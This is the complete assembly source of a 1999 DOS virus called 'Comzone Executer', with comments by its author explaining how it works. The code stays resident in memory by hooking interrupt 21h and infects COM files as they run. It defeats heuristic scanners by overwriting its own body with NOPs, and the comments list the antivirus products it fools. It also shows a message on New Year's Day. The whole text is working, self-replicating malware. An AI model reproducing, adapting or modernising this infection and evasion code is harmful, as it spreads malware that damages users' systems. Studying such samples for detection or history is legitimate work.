    ; comment %
    ;
    ; Comzone Executer Virus
    ; Copyright (C) 1999 by Deadman
    ;
    ; COM/TSR non-overwriting infector
    ;
    ; Some comments:
    ;
    ; First, virus will fool a heuristic analysis through mov ax,1200h/int 2fh. So,
    ; al will be equal 0FFh (MS-DOS installation check, for OS/2 compatibility).
    ; But under analysis al will not be equal 0ffh, and virus will erase its body
    ; with 90h (nop instruction) value. And, analyzer will have an encountered
    ; nop instructions and will pass an infected program.
    ; Fooled antiviruses: F-Prot 3.03a, DrWeb 4.03, Aidstest.
    ; AVP/AVPLite 3.0 - Type_ComTSR
    ; TBScan 7.04 - 4 flags set (F#Mt), probably infected with an unknown virus ;(
    ;
    ; Also virus has a date triggered event, it'll display a string on New Year
    ; Then virus will check memory infection (mov ax,1898h/int 21h/cmp ax,9818h),
    ; and if no virus copy installed, it'll copy its body over the infected
    ; program, after the PSP (CS:0100), and return there. There virus will hook
    ; int 21h, resize memory block, find infected program's name in environment,
    ; store stack address, and execute an infected program through 4bh func-
    ; tion of int 21h, subfunction 00. After the program being executed virus will
    ; restore SS:SP pair (uses new 80386 instruction, LSS SP,DWORD PTR), and stay
    ; resident in memory using legal method (function 31h) with 00 errorlevel.
    ; On int 21h call virus waits 4b00h function and infects the program being
    ; executed, hooking an int 24h handler, saving file time and date, checking
    ; file size overflow. Also virus checks first two bytes for MZ/ZM signature.
    ;
    ; Virus length = 512 (200h) bytes
    ; Negative Checksum = 0FFF8F678h
    ; Destructive actions - none
    ;
    ;                                                Deadman.
    ; %
    model   tiny
    codeseg
    org     100h
    .386
    start:
          mov      ax,1234h
          push     ax bx cx dx si di bp es ds

          mov      ax,1200h
          push     ds
          xor      si,si
          mov      ds,si
          pushf
          call     dword ptr ds:[2fh*4]
          pop      ds
          xor      al,0ffh
          jz       no_heur

          call     next
    next: pop      di
          add      di,no_heur-next
          mov      al,90h
          mov      cx,1000h
          rep      stosb

    no_heur:
          mov      ah,2ah
          int      21h
          cmp      dx,0c1eh
          jne      install

          call     string
    string:
          pop      dx
          add      dx,outp-string
          mov      ah,9
          int      21h
          jmp      $


    install:
          mov      ax,1898h
          int      21h
          cmp      ax,9818h
          je       here

          mov      di,100h
          call     delta
    delta:
          pop      si
          sub      si,delta-start
          mov      cx,vsize
          rep      movsb
          push     offset continue
          ret
    continue:
          mov      ax,3521h
          int      21h
          mov      io21,bx
          mov      io21+2,es
          mov      ah,25h
          lea      dx,int21
          int      21h

          mov      ah,4ah
          mov      bx,(vsize+100h)/16+2
          push     cs
          pop      es
          int      21h
          mov      seg0,cs
          mov      seg1,cs
          mov      seg2,cs

          mov      si,2ch
          mov      ds,[si]
          xor      ax,ax
          xor      si,si

    get_host:
          cmp      word ptr [si],ax
          je       got_host
          inc      si
          jmp      get_host
    got_host:
          lea      dx,[si+4]

          mov      ax,4b00h
          lea      bx,epb
          mov      cs:_sp,sp
          mov      cs:_ss,ss
          int      21h
          lss      sp,dword ptr cs:_sp

          mov      es,cs:[2ch]
          mov      ah,49h
          int      21h

          mov      ax,3100h
          mov      dx,(vsize+100h)/16+2
          xor      si,si
          mov      ds,si
          mov      si,84h
          pushf
          call     dword ptr [si]

    here:
          pop      ds es
          mov      di,100h
          call     get_orig
    get_orig:
          pop      si
          add      si,prev-get_orig
          movsw
          movsb
          pop      bp di si dx cx bx ax
          db       68h,0,1,0c3h

            db      '[ COMZONE ]',0
    outp    db      'ComZone Executer Copyright (c) 1999 by Deadman',0dh,0ah,24h

    prev    db      0c3h,0,0

    epb     dw      0h      ;
            dw      80h     ;    €¤à¥á ª®¬¬ ¤®© áâà®ª¨
    seg0    dw      ?       ;
            dw      5ch     ;    €¤à¥á ¯¥à¢®£® FCB
    seg1    dw      ?       ;
            dw      6ch     ;    €¤à¥á ¢â®à®£® FCB
    seg2    dw      ?       ;

    int21:
            xchg    ax,bx
            cmp     bx,4b00h
            xchg    ax,bx
            je      infect
            cmp     ax,1898h
            jne     exit
            mov     ax,9818h
            iret

    exit:
            db      0eah
    io21    dw      0,0h

    infect: pusha
            push    ds

            mov     bp,ds
            xor     ax,ax
            mov     ds,ax
            mov     si,24h*4
            push    word ptr [si]
            push    word ptr [si+2]
            mov     word ptr [si],offset int24
            mov     word ptr [si+2],cs
            mov     ds,bp

            mov     ax,3d02h
            int     21h
            jc      fail

            xchg    ax,bx
            mov     ax,5700h
            int     21h
            push    cx dx

            mov     ah,3fh
            mov     cx,3
            push    cs
            pop     ds
            lea     dx,prev
            int     21h
            xor     cx,ax
            jnz     close
            mov     ax,word ptr prev
            xor     ax,5050h
            cmp     ax,'MZ' XOR 5050h
            je      close
            cmp     ax,'ZM' XOR 5050h
            je      close

            mov     ax,4202h
            cwd
            int     21h
            or      dx,dx
            jnz     close
            cmp     ax,63000
            ja      close
            cmp     ax,1024
            jb      close
            cmp     byte ptr prev,0e9h
            jne     not_inf
            mov     cx,ax
            sub     cx,vsize
            cmp     word ptr prev+1,cx
            je      close
    not_inf:
            mov     word ptr jump+1,ax
            mov     ah,40h
            mov     cx,vsize
            mov     dx,100h
            int     21h
            jc      close
            xor     cx,ax
            jnz     close
            mov     ax,4200h
            cwd
            int     21h
            mov     ah,40h
            mov     cx,3
            lea     dx,jump
            int     21h
    close:  pop     dx cx
            mov     ax,5701h
            int     21h
            mov     ah,3eh
            int     21h

    fail:   push    0
            pop     ds
            mov     si,24h*4
            pop     word ptr [si+2]
            pop     word ptr [si]

            pop     ds
            popa
            jmp     exit

    int24:  mov     al,3
            iret

    jump    db      0e9h,0,0
    eov:
    vsize   equ     $-start

    _sp     dw      ?
    _ss     dw      ?

            end     start
